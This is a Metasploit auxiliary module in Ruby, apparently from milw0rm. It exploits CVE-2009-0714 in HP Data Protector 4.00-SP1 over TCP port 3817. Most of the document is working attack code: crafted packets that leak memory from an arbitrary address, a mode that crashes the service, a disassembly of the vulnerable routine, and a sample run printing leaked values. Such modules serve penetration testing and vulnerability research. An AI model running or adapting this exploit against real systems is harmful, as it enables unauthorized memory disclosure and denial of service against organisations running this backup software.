##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'HP Data Protector 4.00-SP1 Build 43064 Memory leak and DoS',
			'Description'    => %q{
					HP Data Protector is prone to a memory leak vulnerability. The same
					vector of exploitation can be used for denial of service attack if
					an invalid memory address is accessed.
			},
			'Author'         => [ 'Nibin' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: ???? $',
			'References'     =>
				[
					[ 'URL', 'http://ivizsecurity.com/security-advisory-iviz-sr-09002.html' ],
					[ 'CVE', 'CVE-2009-0714' ],
				],
			'DisclosureDate' => 'May 13 2009'))

			register_options( 
				[
					Opt::RPORT(3817),
					OptString.new('MEMORY', [ false, 'The starting address of memory', '0x7ffdf000']),
					OptString.new('SIZE', [false,'The size of memory to leak (in Bytes)',80]),
					OptString.new('DoS', [false,'Enable or Disable DoS mode',false]),
				], self.class)
	end

	def run

		data =  "\x54\x84\x00\x00"
		data += "\x00\x00\x00\x00"
		data += "\x06\x00\x00\x00"
		data += "\x92\x00\x00\x00"
		data += "x41" * 130

		mem_size = datastore['SIZE'].to_i
		mem_addr = datastore['MEMORY'].hex

		if (mem_addr == 0)
			puts("[!] Starting memory address is zero. Setting it to PEB address (Default)")
			mem_addr = "0x7ffdf000".hex			
		end
		
		if (mem_size < 0)
			puts("[!] Memory size is negative. Setting it to default")
			mem_size = 80
		end
		
		if (!datastore['DoS'])
			offset = 0
			print_status("Starting Memory Address: 0x#{mem_addr.to_s(16)} ")

			while (offset < mem_size)
				connect	
			
				t = ( ( ( ( mem_addr + offset ) - 0x1022A4F0 ) / 4 ) - 4 )
				pkt = data[0,32] +  ([t].pack('V')) + data[36,110] 
				sock.put(pkt)
			
				sleep(1)
				res = sock.get_once
			
				leak = res[32,4].unpack('V')
				puts "[*] Leaking Memory: 0x#{(mem_addr + offset).to_s(16)} ->  0x%x" % [leak.to_s]
				offset +=4
				disconnect
			end
		else
			print_status("Sending evil packet")
			pkt = data
			connect
			sock.put(pkt)
			disconnect
		end

	end
end

=begin

Buggy code @dpwinsup module of dpwingad process running at 3817/TCP port dpwinsup.10275F80

100DDE89   8B15 54A72210    MOV EDX,DWORD PTR DS:[1022A754]
100DDE8F   8B82 98650000    MOV EAX,DWORD PTR DS:[EDX+6598]
100DDE95   8B4C24 54        MOV ECX,DWORD PTR SS:[ESP+54]       ;ECX = user controlled data
100DDE99   8D1481           LEA EDX,DWORD PTR DS:[ECX+EAX*4]    ;EDX = if invalid/valid offset
100DDE9C   8B3495 F0A42210  MOV ESI,DWORD PTR DS:[EDX*4+1022A4F0] ;Crash/Memory Leak
100DDEA3   83C4 1C          ADD ESP,1C
100DDEA6   897424 10        MOV DWORD PTR SS:[ESP+10],ESI


n@n-laptop:/mnt/projects/metasploit$ ./msfcli auxiliary/admin/dataprotector/hp_dataprotector RHOST=172.16.145.129 MEMORY=0x7ffdf000 E
[*]Please wait while we load the module tree...
[*] Starting Memory Address: 0x7ffdf000 
[*] Leaking Memory: 0x7ffdf000 ->  0x12fbc4
[*] Leaking Memory: 0x7ffdf004 ->  0x130000
[*] Leaking Memory: 0x7ffdf008 ->  0x12d000
[*] Leaking Memory: 0x7ffdf00c ->  0x0
[*] Leaking Memory: 0x7ffdf010 ->  0x1e00
[*] Leaking Memory: 0x7ffdf014 ->  0x0
[*] Leaking Memory: 0x7ffdf018 ->  0x7ffdf000
[*] Leaking Memory: 0x7ffdf01c ->  0x0
[*] Leaking Memory: 0x7ffdf020 ->  0x674
[*] Leaking Memory: 0x7ffdf024 ->  0xa8
[*] Leaking Memory: 0x7ffdf028 ->  0x0
[*] Leaking Memory: 0x7ffdf02c ->  0x0
[*] Leaking Memory: 0x7ffdf030 ->  0x7ffd5000
[*] Leaking Memory: 0x7ffdf034 ->  0x0
[*] Leaking Memory: 0x7ffdf038 ->  0x0
[*] Leaking Memory: 0x7ffdf03c ->  0x0
[*] Leaking Memory: 0x7ffdf040 ->  0xe20abeb0
[*] Leaking Memory: 0x7ffdf044 ->  0x0
[*] Leaking Memory: 0x7ffdf048 ->  0x0
[*] Leaking Memory: 0x7ffdf04c ->  0x0

=end

# milw0rm.com [2009-06-23]
